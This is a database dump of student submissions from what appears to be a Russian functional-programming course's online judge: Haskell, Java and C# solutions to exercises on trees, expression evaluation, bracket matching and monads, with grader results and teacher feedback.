(4093, 98, '51559263', '2012-11-24 00:17:43', 1, 'data Tree = Empty | Node Char Tree Tree deriving Show\r\n\r\n\r\n\r\ntoStr Empty = "e"\r\n\r\n\r\n\r\ntoStr ( Node x l r ) = ''n'' : x : ( (toStr l) ++ (toStr r) )\r\n\r\n\r\n\r\n\r\n\r\nsplit _ (-1) cut = cut\r\n\r\n\r\n\r\nsplit ( c : str ) n cut = if c == ''n''\r\n\r\n						  then split str ( n + 1 ) ( cut + 1 )\r\n\r\n						  else if c == ''e''\r\n\r\n						       then split str ( n - 1 ) ( cut + 1 )\r\n\r\n							   else split str n ( cut + 1 )\r\n\r\n\r\n\r\nfromStr "e" = Empty\r\n\r\n\r\n\r\nfromStr ( ''n'' : x : str ) = let \r\n\r\n                                n = split str 0 0\r\n\r\n							in \r\n\r\n							   ( Node x ( fromStr (take n str) ) ( fromStr (drop n str) ) )\r\n', '<br/>Тесты успешно пройдены!'),
(4094, 111, '318210', '2012-11-24 08:42:25', 1, 'data Expr = N Int | Var String | Add Expr Expr| Mult Expr Expr\r\n\r\n\r\neval (Var ch) (x:xs)\r\n	| fst x == ch = snd x\r\n	| otherwise = eval (Var ch) xs\r\n		\r\neval (N i) _ = i\r\n\r\neval (Add e1 e2) l = eval e1 l + eval e2 l\r\neval (Mult e1 e2) l = eval e1 l * eval e2 l', '<br/>Тесты успешно пройдены!'),
(4095, 112, '318210', '2012-11-24 09:26:10', 1, 'data Expr = N Int | Var String | Add Expr Expr| Mult Expr Expr | Let String Int Expr\r\n\r\n\r\neval (Var ch) (x:xs)\r\n	| fst x == ch = snd x\r\n	| otherwise = eval (Var ch) xs\r\n		\r\neval (Let ch i e) l = eval e ((ch,i):l)\r\n\r\neval (Add e1 e2) l = eval e1 l + eval e2 l\r\neval (Mult e1 e2) l = eval e1 l * eval e2 l', '<br/>Тесты успешно пройдены!'),
(4096, 118, '2118411', '2012-11-24 10:22:42', 1, 'find cond (x:xs) = if cond x then (x, xs) else find cond xs\r\nf1 >>> f2 = f2.snd.f1\r\nf = find (>3) >>> find (>3)', '<br/>Тесты успешно пройдены!'),
(4097, 115, '2118411', '2012-11-24 10:24:29', 1, 'find cond [] = []\r\nfind cond (x:xs) = if cond x then [x] else find cond xs\r\n\r\nf xs = let tmps = find (<5) xs >>= x->x:(find (>10) xs >>= 	-> t:(find (/=7) xs)) in if length tmps/=3 then [] else [sum tmps]\r\n', '<br/>Тесты успешно пройдены!'),
(4098, 98, '442421', '2012-11-24 12:33:28', 1, 'data Tree = Empty | Node Char Tree Tree deriving Show\r\n\r\ntoStr Empty = ""\r\ntoStr (Node a l r) = a:''('':(toStr l)++")"++"("++(toStr r)++")"\r\n\r\nfromStr [] = Empty\r\nfromStr "()" = Empty\r\nfromStr (x:xs) = Node x (fromStr (readL xs)) (fromStr (readR xs))\r\n\r\nreadL (x:xs) = readL'' [] xs 1 0\r\nreadL'' r (''('':xs) a b = readL'' (r++[''('']) xs (a+1) b\r\nreadL'' r ('')'':xs) a b = if a==b+1 then r else readL'' (r++['')'']) xs a (b+1)\r\nreadL'' r (x:xs) a b = readL'' (r++[x]) xs a b\r\n\r\nreadR (x:xs) = readR'' xs 1 0\r\nreadR'' (''('':xs) a b = if a==b then readL'' [] xs 1 0 else readR'' xs (a+1) b\r\nreadR'' ('')'':xs) a b = readR'' xs a (b+1)\r\nreadR'' (x:xs) a b = readR'' xs a b\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4099, 97, '419046', '2012-11-24 14:19:41', 1, 'checkBrackets str = checkBrackets1 str ""\r\n\r\ncheckBrackets1 "" "" = True\r\n\r\ncheckBrackets1 "" _ = False\r\n\r\ncheckBrackets1 (s:str) stack = if (s == ''('')||(s == ''['') then checkBrackets1 str (s:stack)\r\n\r\n                               else if (length stack /= 0)&&(s == '')'')&&(head stack == ''('') \r\n\r\n							        then True && (checkBrackets1 str (tail stack))\r\n\r\n							   else if (length stack /= 0)&&(s == '']'')&&(head stack == ''['') \r\n\r\n							        then True && (checkBrackets1 str (tail stack))\r\n\r\n							   else False\r\n', '<br/>Тесты успешно пройдены!'),
(4100, 97, 'erwert', '2012-11-24 15:29:53', 0, 'queens n k = go n k (x -> True)\r\ngo n 0 c = [[]]\r\ngo n k c = [h:hs | h <- [(i,j) | i <- [1..k], j <- [1..n]], c h, hs <- go n (k-1) (x -> c x && (fst h /= fst x && snd h /= snd x && abs (snd x - snd h) /= abs (fst x - fst h)))]', 'Не удалось вычислить выражение "checkBrackets [''('',''['','']'','')'']", проверьте правильность синтаксиса'),
(4101, 108, 'erwert', '2012-11-24 15:30:40', 2, '  --- У вас две проблемыю Во первых в условии было "первый ферзь всегда стоит на первй вертикали, второй ферзь - на второй и т.д."\r\n  --- А у вас наоборот - первый ферхь - на последней вертикали и тд\r\n  --- Вторая проблема более существенная - в вас очень неэффективно работает, и в результате уже для доскм 8 на 8   \r\n  --- считает слишком долго.. \r\n  --- Причем ускорить очень легко.. Просто, вы ведь _знаете_ на какой вертикали стоит каждый ферзь )см выше)\r\n  --- Значит, при переборе, вертикали перебирать не надо, их надопросто примваивать.\r\n  --- Попроьуйте исправить. пожалуйста, скажем до пятницы включительно.\r\nqueens n k = go n k (x -> True)\r\ngo n 0 c = [[]]\r\ngo n k c = [h:hs | h <- [(i,j) | i <- [1..k], j <- [1..n]], \r\n                   c h, \r\n                   hs <- go n (k-1) \r\n                       (x -> c x && (fst h /= fst x && \r\n                                    snd h /= snd x && \r\n                                    abs (snd x - snd h) /= abs (fst x - fst h)))]', 'Не удалось вычислить выражение "length (queens 8 8)", проверьте правильность синтаксиса'),
(4102, 97, 'erwert', '2012-11-24 15:31:41', 1, 'checkBrackets l = (foldl (a b -> if b == ''('' then (1:a) else if b == ''['' then (2:a) else if (b == '']'' && a /= [] && head a == 2) || (b =='')'' && a /= [] && head a == 1) then tail a else (3:a)) [] l) == []', '<br/>Тесты успешно пройдены!'),
(4103, 109, 'hasp', '2012-11-24 20:50:10', 1, '/*Stub, задачка отправлена на почту*/\r\npublic class Task29_1 {\r\n    interface Function2<A, B> {\r\n        B apply(A a);\r\n    }\r\n\r\n    interface Function0 {\r\n        void apply();\r\n    }\r\n\r\n    static void allDiffLists(final int n, final int k, final Function2<Integer, Boolean> set, final Function0 printer) {\r\n        if (k == 0) {\r\n            printer.apply();\r\n            System.out.println();\r\n            return;\r\n        }\r\n\r\n        for (int i = 1; i <= n; ++i) {\r\n            final int j = i;\r\n            if (!set.apply(j)) {\r\n                allDiffLists(n, k - 1, new Function2<Integer, Boolean>() {\r\n                    public Boolean apply(Integer in) { return set.apply(in) || in == j; }\r\n                }, new Function0() {\r\n                        public void apply() {\r\n                            System.out.print(j + "  ");\r\n                            printer.apply();\r\n                        }\r\n                    });\r\n            }\r\n        }\r\n    }}', '<br/>Тесты успешно пройдены!'),
(4104, 99, 'hasp', '2012-11-24 20:51:02', 1, '/*Stub, задачка отправлена на почту*/\r\npublic class Task_26_1 {\r\n    interface Expr {\r\n        Expr diff();\r\n    }\r\n\r\n  static class Const implements Expr {\r\n        private final int val;\r\n        Const(int val) { this.val = val; }\r\n\r\n        public Expr diff() {\r\n            return new Const(0);\r\n        }\r\n\r\n        public String toString() {\r\n            return "(Const: " + val + ")";\r\n        }\r\n    }\r\n    \r\n  static class Var implements Expr {\r\n        private final String name;\r\n        Var(String name) { this.name = name; }\r\n\r\n        public Expr diff() {\r\n            return new Const(1);\r\n        }\r\n\r\n        public String toString() {\r\n            return "(" + name + ")";\r\n        }\r\n    }\r\n', '<br/>Тесты успешно пройдены!'),
(4105, 110, 'hasp', '2012-11-24 20:52:20', 1, '/*Stub, задачка отправлена на почту*/\r\npublic class Task_29_2 {\r\n    interface Predicate<T> {\r\n        boolean satisfy(T t);\r\n    }\r\n    \r\n    static abstract class Lazy<T> {\r\n        private T value;\r\n        \r\n        protected abstract T compute();\r\n        public T getValue() {\r\n            return value == null? value = compute() : value;\r\n        }\r\n    }\r\n    \r\n    static <T> T find(Iterable<T> c, Predicate<T> p, Lazy<T> f) {\r\n        for (T t : c) \r\n            if (p.satisfy(t)) return t;\r\n        return f.getValue();\r\n    }}', '<br/>Тесты успешно пройдены!'),
(4106, 118, 'hasp', '2012-11-24 21:00:52', 1, 'find cond (x:xs) = if cond x then (x, xs) else find cond xs\r\n\r\ng >>> f = 	 -> let (_, xs) = g t; (x, xs2) = f xs in (x, xs2)\r\nf = find (>3) >>> find (>3)', '<br/>Тесты успешно пройдены!'),
(4107, 115, 'hasp', '2012-11-24 21:19:05', 0, 'find cond [] = []\r\nfind cond (x:xs) = if cond x then [x] else find cond xs\r\n\r\n[] >>> _ = []\r\n_ >>> [] = []\r\nl@(x:xs) >>> a:[] = a:l\r\n\r\n\r\nf l = let ff = c -> find c l in case ff (<5) >>> ff (>10) >>> ff (/=7) of {[] -> []; a:b:c:[] -> [a+b+c]}', 'Не удалось вычислить выражение "f [7, 6, 4, 3, 20, 15, 9] ", проверьте правильность синтаксиса'),
(4108, 115, 'hasp', '2012-11-24 21:20:18', 1, '[] >>> _ = []\r\n_ >>> [] = []\r\nl@(x:xs) >>> a:[] = a:l\r\n\r\n\r\nf l = let ff = c -> find c l in case ff (<5) >>> ff (>10) >>> ff (/=7) of {[] -> []; a:b:c:[] -> [a+b+c]}', 'Не удалось вычислить выражение "f [7, 6, 4, 3, 20, 15, 9] ", проверьте правильность синтаксиса'),
(4109, 113, '2562137', '2012-11-24 22:11:01', 1, 'sum_cps :: [Integer] -> (Integer -> Integer) -> Integer\r\n\r\n\r\n\r\nsum_cps list fun =\r\n\r\n	case list of\r\n\r\n		(x:xs) -> sum_cps xs (y -> fun (x+y))\r\n\r\n		[] -> fun 0\r\n\r\n\r\n\r\ntest = (\r\n\r\n	sum_cps [1,2,3] id,\r\n\r\n	sum_cps [1,2,3] (^2)\r\n\r\n	)\r\n', '<br/>Тесты успешно пройдены!'),
(4110, 114, '2562137', '2012-11-24 22:21:20', 1, 'triangle1 n = [1..n] >>= x -> [1..x] >>= y -> return y\r\n\r\n\r\n\r\ntriangle2 n = do\r\n\r\n	x <- [1..n]\r\n\r\n	y <- [1..x]\r\n\r\n	return y\r\n\r\n\r\n\r\ntest = (\r\n\r\n    triangle1 3,\r\n\r\n	triangle2 3\r\n\r\n	)\r\n', '<br/>Тесты успешно пройдены!'),
(4111, 112, '97440347', '2012-11-25 06:41:15', 2, '  --- Не совсем правильно..\r\n  --- Смотрите, вот такой тест\r\n  ---   eval (Let "x" 10 (Mult (Var "x") (Var "y"))) [("x",0),("y", 2)]\r\n  --- соответствует выражению let x = 10 in x*y при значениях переменных x=0 y=2\r\n  --- и должен возвращать 20. А у вас вернет 0.\r\n  --- Попробуйте исправить, пожалуйста (а я сейчас добавлю такой тест).\r\n  --- Если вдруг не получится исправить, выложите это решение снова, я его и так зачту.\r\ndata Expr = Let String Integer Expr|Var String|X|N Integer|Add Expr Expr|Mult Expr Expr deriving Show\r\nsimplify2 (Mult x (N 0)) = (N 0)\r\nsimplify2 (Mult (N 0) x) = (N 0)\r\nsimplify2 (Mult x y) = (Mult x y)\r\nsimplify (Mult x (N 0)) = (N 0)\r\nsimplify (Mult (N 0) x) = (N 0)\r\nsimplify (Mult x y) = simplify2 (Mult (simplify x) (simplify y))\r\nsimplify (Add x y) = Add (simplify x) (simplify y)\r\nsimplify (N i) = (N i)\r\nsimplify x = x\r\neval (Var v_symb) [] = 0\r\neval (Var v_symb) (c:cs) = if (fst c == v_symb)\r\n						  then (snd c)\r\n		                  else (eval (Var v_symb) cs)\r\neval (N i) n = i\r\neval (Mult x y) n = (eval x n)*(eval y n)\r\neval (Add x y) n = (eval x n) + (eval y n)\r\neval (Let v_symb val x) (c:cs) = eval x ((c:cs)++[(v_symb,val)])', '<br/>Тесты успешно пройдены!'),
(4112, 111, '97440347', '2012-11-25 06:42:14', 1, 'data Expr = Var String|X|N Integer|Add Expr Expr|Mult Expr Expr deriving Show\r\nsimplify2 (Mult x (N 0)) = (N 0)\r\nsimplify2 (Mult (N 0) x) = (N 0)\r\nsimplify2 (Mult x y) = (Mult x y)\r\nsimplify (Mult x (N 0)) = (N 0)\r\nsimplify (Mult (N 0) x) = (N 0)\r\nsimplify (Mult x y) = simplify2 (Mult (simplify x) (simplify y))\r\nsimplify (Add x y) = Add (simplify x) (simplify y)\r\nsimplify (N i) = (N i)\r\nsimplify x = x\r\neval (Var v_symb) [] = 0\r\neval (Var v_symb) (c:cs) = if (fst c == v_symb)\r\n						  then (snd c)\r\n		                  else (eval (Var v_symb) cs)\r\neval (N i) n = i\r\neval (Mult x y) n = (eval x n)*(eval y n)\r\neval (Add x y) n = (eval x n) + (eval y n)', '<br/>Тесты успешно пройдены!'),
(4113, 115, '44060', '2012-11-25 07:46:44', 2, '  --- Тут надо определить find, как написано в условии - это не стандартная функция.\r\n  --- Это просто, но допишите ее пожалуйста\r\nf xs = sum (do i<-find (<5) xs; j<-find (>10) xs; k<-find (/=7) xs; [i,j,k])', 'Не удалось вычислить выражение "f [7, 6, 4, 3, 20, 15, 9] ", проверьте правильность синтаксиса'),
(4114, 113, '97440347', '2012-11-25 07:46:49', 1, 'sum_cps [x] f = f x\r\nsum_cps (x:xs) f = sum_cps xs (f.(+x))', '<br/>Тесты успешно пройдены!'),
(4115, 118, '44060', '2012-11-25 07:52:27', 1, '(>>>) fp1 fp2 xs = let (n, rez) = fp1 xs in fp2 rez', 'Не удалось вычислить выражение "let f = find (>3) >>> find (>3) in f [1, 3, 5, 2, 20, 25, 2]", проверьте правильность синтаксиса'),
(4116, 111, '44060', '2012-11-25 10:02:57', 1, 'data Expr = Var String | Add Expr Expr | Mult Expr Expr | N Integer deriving (Show, Eq)\r\neval (Add e1 e2) vars = let rez1 = eval e1 vars ;\r\n							rez2 = eval e2 vars\r\n							in rez1 + rez2\r\neval (Mult e1 e2) vars = let rez1 = eval e1 vars ;\r\n							rez2 = eval e2 vars\r\n							in rez1 * rez2\r\neval (N n) vars = n\r\neval (Var var) vars = head (vars >>=  (x,v) -> if x == var then [v] else [])', '<br/>Тесты успешно пройдены!'),
(4117, 112, '44060', '2012-11-25 10:03:52', 1, 'data Expr = Var String | Add Expr Expr | Mult Expr Expr | N Integer|Let (String, Expr) Expr deriving (Show, Eq)\r\neval (Add e1 e2) vars = let rez1 = eval e1 vars ;\r\n							rez2 = eval e2 vars\r\n							in rez1 + rez2\r\neval (Mult e1 e2) vars = let rez1 = eval e1 vars ;\r\n							rez2 = eval e2 vars\r\n							in rez1 * rez2\r\neval (N n) vars = n\r\neval (Var var) vars = head (vars >>=  (x,v) -> if x == var then [v] else [])\r\neval (Let (var, valueExpr) e) vars = let value = eval valueExpr vars \r\n										in eval e ((var, value):vars)', 'Не удалось вычислить выражение "eval (Let [''x''] 10 (Mult (Var [''x'']) (Var [''y'']))) [([''y''], 2)]", проверьте правильность синтаксиса'),
(4118, 108, '44060', '2012-11-25 10:42:13', 1, 'queens n k = map ((x, _) -> x) (f n k)\r\n		where\r\n			f n 0 = [([], \\_ _ -> False)]\r\n			f n k = [((k, j):x, x1 x2 -> x2 == j || ch x1 x2 || abs (x1 - k) == abs (x2 - j)) | (x, ch) <- f n (k - 1), j <- [1..n], not (ch k j)]', '<br/>Тесты успешно пройдены!'),
(4119, 111, '82873297', '2012-11-25 10:49:46', 1, 'data Expr = Var [Char] | N Integer | Add Expr Expr | Mult Expr Expr\r\n\r\n\r\n\r\neval (Var x) xvs = getVal x xvs\r\n\r\neval (N i) _ = i\r\n\r\neval (Add e1 e2) xvs = (eval e1 xvs)+(eval e2 xvs)\r\n\r\neval (Mult e1 e2) xvs = (eval e1 xvs)*(eval e2 xvs)\r\n\r\n\r\n\r\ngetVal x (xv:xvs) | (fst xv == x) = snd xv\r\n\r\n                  | otherwise = getVal x xvs\r\n', '<br/>Тесты успешно пройдены!'),
(4120, 112, '82873297', '2012-11-25 10:49:56', 1, 'data Expr = Var [Char] | N Integer | Add Expr Expr | Mult Expr Expr | Let [Char] Integer Expr\r\n\r\n\r\n\r\neval (Var x) xvs = getVal x xvs\r\n\r\neval (N i) _ = i\r\n\r\neval (Add e1 e2) xvs = (eval e1 xvs)+(eval e2 xvs)\r\n\r\neval (Mult e1 e2) xvs = (eval e1 xvs)*(eval e2 xvs)\r\n\r\neval (Let x v e) xvs = eval e ((x,v):xvs)\r\n\r\n\r\n\r\ngetVal x (xv:xvs) | (fst xv == x) = snd xv\r\n\r\n                  | otherwise = getVal x xvs\r\n', '<br/>Тесты успешно пройдены!'),
(4121, 113, '82873297', '2012-11-25 10:50:13', 2, '   --- Нет, хоть формально некоторые требования выполнены, но это не comnstinuation passing style.. \r\nsum_cps [x] f = f x\r\n\r\nsum_cps (x:y:xs) f = sum_cps ((x+y):xs) f\r\n', '<br/>Тесты успешно пройдены!'),
(4122, 114, '82873297', '2012-11-25 10:50:35', 1, 'triangle1 n = [1..n] >>= x->[1..x]\r\n\r\n\r\n\r\ntriangle2 n = do {x<-[1..n];[1..x]}\r\n', '<br/>Тесты успешно пройдены!'),
(4123, 115, '82873297', '2012-11-25 10:50:56', 1, 'find cond [] = []\r\n\r\nfind cond (x:xs) = if cond x then [x] else find cond xs\r\n\r\n\r\n\r\nf xs = do{x<-(find (<5) xs); y<-(find (>10) xs); z<-(find (/=7) xs); [x+y+z]}\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4124, 106, '44060', '2012-11-25 10:58:02', 1, 'check _ Nothing = Nothing\r\ncheck s (Just x) = if f s x 0 then Just x else Nothing\r\n		where\r\n			f [] _ a = a > 0\r\n			f (x:s) y a = if x /= y then f s y (a - 1) \r\n						else f s y (a + 1) \r\n\r\nfindMajor s = check s (func s Nothing 0)\r\n		where\r\n			func [] result _ = result\r\n			func (x:s) Nothing 0 = func s (Just x) 1\r\n			func (x:s) (Just y) z = if x /= y then if z > 1 then func s (Just y) (z - 1)\r\n									else func s Nothing 0\r\n						else func s (Just y) (z + 1)', '<br/>Тесты успешно пройдены!'),
(4125, 110, '44060', '2012-11-25 11:04:53', 1, 'public static int find(int[] arr, Predicate<int> f, Func<int> error) \r\n		{\r\n			foreach (int a in arr)\r\n			{\r\n				if (f(a))\r\n				{ return a; }\r\n			}\r\n			return error();\r\n		}\r\n		\r\n		public static int Example_From_Class(int[] arr)\r\n		{ return find(arr, a => a < 10, () => find(a => a < 20, arr, () => 20)); }', '<br/>Тесты успешно пройдены!'),
(4126, 109, '44060', '2012-11-25 11:14:56', 1, 'private static void Ch( Func<int, bool> isInSet, int n, int k, Action f)\r\n	{\r\n		for (int i = 1;i < (n + 1);i++)\r\n		{\r\n			if (isInSet(i))\r\n			{ Ch(x => !isInSet(x) || x == i, n, k - 1, () => { f(); Console.Write("{0} ", i); }); }\r\n		}\r\n\r\n		if (k == 0)\r\n		{\r\n			f();\r\n			Console.WriteLine(); return;\r\n		}\r\n	}\r\n		\r\n	public static void AllDiffLists(int n, int k) \r\n	{ Ch(x => true, n, k, () => {}); }\r\n', '<br/>Тесты успешно пройдены!'),
(4127, 99, '397095', '2012-11-25 11:55:37', 1, 'package me.grigoriev.expr;\r\n\r\n\r\n\r\n/**\r\n\r\n * User: ortemij\r\n\r\n * Date: 25.11.12\r\n\r\n * Time: 15:43\r\n\r\n */\r\n\r\npublic class Expressions {\r\n\r\n\r\n\r\n    public static Expression diff(Expression e) {\r\n\r\n        return e.derivative();\r\n\r\n    }\r\n\r\n\r\n\r\n    public static void main(String[] args) {\r\n\r\n        {\r\n\r\n            Expression e = new Multiplication(new Addition(new Variable(), new Constant(3)), new Multiplication(new Variable(), new Constant(2)));\r\n\r\n            System.out.println(diff(e));\r\n\r\n        }\r\n\r\n\r\n\r\n        {\r\n\r\n            Expression e = new Multiplication(new Variable(), new Variable());\r\n\r\n            System.out.println(diff(e));\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n\r\ninterface Expression {\r\n\r\n\r\n\r\n    Expression derivative();\r\n\r\n}\r\n\r\n\r\n\r\nabstract class DuoExpression implements Expression {\r\n\r\n\r\n\r\n    private final Expression left;\r\n\r\n    private final Expression right;\r\n\r\n\r\n\r\n    protected DuoExpression(Expression left, Expression right) {\r\n\r\n        this.left = left;\r\n\r\n        this.right = right;\r\n\r\n    }\r\n\r\n\r\n\r\n    public Expression getLeft() {\r\n\r\n        return left;\r\n\r\n    }\r\n\r\n\r\n\r\n    public Expression getRight() {\r\n\r\n        return right;\r\n\r\n    }\r\n\r\n\r\n\r\n    @Override\r\n\r\n    public String toString() {\r\n\r\n        return "(" + getLeft().toString() + " " + getSign() + " " + getRight().toString() + ")";\r\n\r\n    }\r\n\r\n\r\n\r\n    protected abstract char getSign();\r\n\r\n}\r\n\r\n\r\n\r\nclass Addition extends DuoExpression {\r\n\r\n\r\n\r\n    protected Addition(Expression left, Expression right) {\r\n\r\n        super(left, right);\r\n\r\n    }\r\n\r\n\r\n\r\n    @Override\r\n\r\n    protected char getSign() {\r\n\r\n        return ''+'';\r\n\r\n    }\r\n\r\n\r\n\r\n    @Override\r\n\r\n    public Expression derivative() {\r\n\r\n        return new Addition(getLeft().derivative(), getRight().derivative());\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n\r\nclass Multiplication extends DuoExpression {\r\n\r\n\r\n\r\n    protected Multiplication(Expression left, Expression right) {\r\n\r\n        super(left, right);\r\n\r\n    }\r\n\r\n\r\n\r\n    @Override\r\n\r\n    protected char getSign() {\r\n\r\n        return ''*'';\r\n\r\n    }\r\n\r\n\r\n\r\n    @Override\r\n\r\n    public Expression derivative() {\r\n\r\n        return\r\n\r\n                new Addition(\r\n\r\n                    new Multiplication(getLeft().derivative(), getRight()),\r\n\r\n                    new Multiplication(getLeft(), getRight().derivative())\r\n\r\n                );\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n\r\nclass Constant implements Expression {\r\n\r\n\r\n\r\n    private final int value;\r\n\r\n\r\n\r\n    public Constant(int value) {\r\n\r\n        this.value = value;\r\n\r\n    }\r\n\r\n\r\n\r\n    @Override\r\n\r\n    public Expression derivative() {\r\n\r\n        return new Constant(0);\r\n\r\n    }\r\n\r\n\r\n\r\n    @Override\r\n\r\n    public String toString() {\r\n\r\n        return String.valueOf(value);\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n\r\nclass Variable implements Expression {\r\n\r\n\r\n\r\n    @Override\r\n\r\n    public Expression derivative() {\r\n\r\n        return new Constant(1);\r\n\r\n    }\r\n\r\n\r\n\r\n    @Override\r\n\r\n    public String toString() {\r\n\r\n        return "x";\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4128, 97, '63706456', '2012-11-25 12:57:17', 1, 'checkBrackets ls = brackets ls []\r\n\r\nbrackets [] ls = length ls == 0\r\nbrackets (x:xs) ls 	\r\n		| x `elem` "([" = brackets xs (x:ls)\r\n		| x `elem` "])" = if (length ls == 0) || not (match x (head ls))\r\n					then False\r\n					else brackets xs (tail ls)\r\n\r\nmatch '']'' ''['' = True\r\nmatch '')'' ''('' = True\r\nmatch _ _ = False', '<br/>Тесты успешно пройдены!'),
(4129, 97, '4837959', '2012-11-25 13:46:58', 1, 'checkBrackets expr = checkBrackets'' expr ""\r\n\r\ncheckBrackets'' "" "" = True\r\n\r\ncheckBrackets'' "" _ = False\r\n\r\ncheckBrackets'' (c:expr) stack\r\n\r\n    | c == '')'' && length stack > 0 && head stack == ''('' = checkBrackets'' expr (tail stack)\r\n\r\n    | c == '']'' && length stack > 0 && head stack == ''['' = checkBrackets'' expr (tail stack)\r\n\r\n    | c == '')'' || c == '']'' = False\r\n\r\n    | otherwise = checkBrackets'' expr (c:stack)\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4130, 98, '4837959', '2012-11-25 14:20:24', 1, 'data Tree = Node Char Tree Tree | Empty deriving Show\r\n\r\n\r\n\r\ntoStr tree = reverse $ toStr'' tree ""\r\n\r\ntoStr'' Empty str = ''#'':str\r\n\r\ntoStr'' (Node c t1 t2) str = toStr'' t2 (toStr'' t1 (c:str))\r\n\r\n\r\n\r\nfromStr str = fst $ fromStr'' str\r\n\r\nfromStr'' (c:str) = if c /= ''#''\r\n\r\n                   then let\r\n\r\n                            (leftTree, strAfterLeft) = fromStr'' str\r\n\r\n                            (rightTree, strAfterRight) = fromStr'' strAfterLeft\r\n\r\n                        in ((Node c leftTree rightTree), strAfterRight)\r\n\r\n                   else (Empty, str)\r\n\r\n\r\n\r\ntest = toStr (Node ''a'' (Node ''b'' Empty (Node ''b'' Empty Empty)) (Node ''c'' Empty Empty))\r\n\r\ntest2 = fromStr (toStr (Node ''a'' (Node ''b'' Empty (Node ''b'' Empty Empty)) (Node ''c'' Empty Empty)))\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(4131, 118, '97440347', '2012-11-25 15:46:45', 0, 'find cond (x:xs) = if cond x \r\n				   then (x, xs)\r\n				   else find cond xs\r\n(s1 >>> s2) s = let\r\n					p = (s1 s)\r\n			  in (s2 snd(p))', 'Не удалось вычислить выражение "let f = find (>3) >>> find (>3) in f [1, 3, 5, 2, 20, 25, 2]", проверьте правильность синтаксиса'),
(4132, 118, '97440347', '2012-11-25 15:55:45', 1, 'find cond (x:xs) = if cond x then (x, xs) else find cond xs\r\n(s1 >>> s2) s = let\r\n						p = (s1 s)\r\n			    in s2 (snd p)', '<br/>Тесты успешно пройдены!'),
(4133, 116, '97440347', '2012-11-25 15:57:07', 1, 'toInt n = n (x -> x + 1) 0', '<br/>Тесты успешно пройдены!'),
(4134, 114, '97440347', '2012-11-25 16:00:45', 1, 'triangle1 n = return ([1..n]>>= x -> [1..x])\r\ntriangle2 n = do \r\n					x <- [1..n]\r\n					y <- [1..x]\r\n					return y', '<br/>Тесты успешно пройдены!'),
(4135, 115, '97440347', '2012-11-25 16:01:37', 1, 'find cond [] = []\r\nfind cond (x:xs) = if cond x then [x] else find cond xs\r\nf xs = if (length ((find (<5) xs)++(find (>10) xs)++(find (/=7) xs)) == 3)\r\n	   then [sum ((find (<5) xs)++(find (>10) xs)++(find (/=7) xs))]\r\n	   else []', '<br/>Тесты успешно пройдены!'),
(4136, 99, '442421', '2012-11-25 16:34:24', 1, '  --- ОК, засчитано, но я, на самом деле, сделал бы не совсем так. В условии шла речь о _внутреннем_ представлении для выражений, те со строчками работать было не обязательно, и я бы не стал это делать.\r\n  --- Если работать только со внутренним представлением, то получится, мне кажется, гораздо проще.\r\n﻿using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Text;\r\n\r\n\r\n\r\nnamespace _26._1\r\n\r\n{\r\n\r\n    class Expression\r\n\r\n    {\r\n\r\n        string inputStr;\r\n\r\n        string evalStr;\r\n\r\n        int pos;\r\n\r\n        const char EOI = ''�'';\r\n\r\n\r\n\r\n        public Expression(string str)\r\n\r\n        {\r\n\r\n            inputStr = str;\r\n\r\n        }\r\n\r\n        public int Eval(int x)\r\n\r\n        {\r\n\r\n            pos = 0;\r\n\r\n            evalStr = inputStr.Replace("x", x.ToString());\r\n\r\n            return eExpr();\r\n\r\n        }\r\n\r\n        public string Diff()\r\n\r\n        {\r\n\r\n            pos = 0;\r\n\r\n            evalStr = inputStr;\r\n\r\n            return dExpr();\r\n\r\n        }\r\n\r\n\r\n\r\n        #region Helpers\r\n\r\n        char NextChar()\r\n\r\n        {\r\n\r\n            char retVal;\r\n\r\n            if (pos >= evalStr.Length)\r\n\r\n            {\r\n\r\n                retVal = EOI;\r\n\r\n            }\r\n\r\n            else\r\n\r\n            {\r\n\r\n                retVal = evalStr[pos++];\r\n\r\n            }\r\n\r\n            return retVal;\r\n\r\n        }\r\n\r\n        void PushBack()\r\n\r\n        {\r\n\r\n            --pos;\r\n\r\n        }\r\n\r\n        bool IsDigit(char c)\r\n\r\n        {\r\n\r\n            return Char.IsDigit(c);\r\n\r\n        }\r\n\r\n        #endregion\r\n\r\n        #region Eval\r\n\r\n        int ePrim()\r\n\r\n        {\r\n\r\n            int retVal;\r\n\r\n            char c = NextChar();\r\n\r\n            switch (c){\r\n\r\n                case ''('':{\r\n\r\n                    retVal = eExpr();\r\n\r\n                    if (NextChar()!='')'')\r\n\r\n                    {\r\n\r\n                        throw new Exception();\r\n\r\n                    }\r\n\r\n                    break;\r\n\r\n                }\r\n\r\n                default:{\r\n\r\n                    PushBack();\r\n\r\n                    retVal = eNumber();\r\n\r\n                    break;\r\n\r\n                }\r\n\r\n            }\r\n\r\n            return retVal;\r\n\r\n        }\r\n\r\n        int eNumber()\r\n\r\n        {\r\n\r\n            char c = NextChar();\r\n\r\n            int retVal = 0;\r\n\r\n            retVal = c - ''0'';\r\n\r\n            c = NextChar();\r\n\r\n            while (Char.IsDigit(c))\r\n\r\n            {\r\n\r\n                retVal = retVal * 10 + c - ''0'';\r\n\r\n                c = NextChar();\r\n\r\n            }\r\n\r\n            PushBack();\r\n\r\n            return retVal;\r\n\r\n        }\r\n\r\n\r\n\r\n        int eTerm()\r\n\r\n        {\r\n\r\n            int p = ePrim();\r\n\r\n            int retVal;\r\n\r\n            char c = NextChar();\r\n\r\n            if (c == ''*'')\r\n\r\n            {\r\n\r\n                retVal = p * eTerm();\r\n\r\n            }\r\n\r\n            else\r\n\r\n            {\r\n\r\n                PushBack();\r\n\r\n                retVal = p;\r\n\r\n            }\r\n\r\n            return retVal;\r\n\r\n        }\r\n\r\n\r\n\r\n        int eExpr()\r\n\r\n        {\r\n\r\n            int retVal;\r\n\r\n            int t = eTerm();\r\n\r\n            char c = NextChar();\r\n\r\n            if (c == ''+'')\r\n\r\n            {\r\n\r\n                int e = 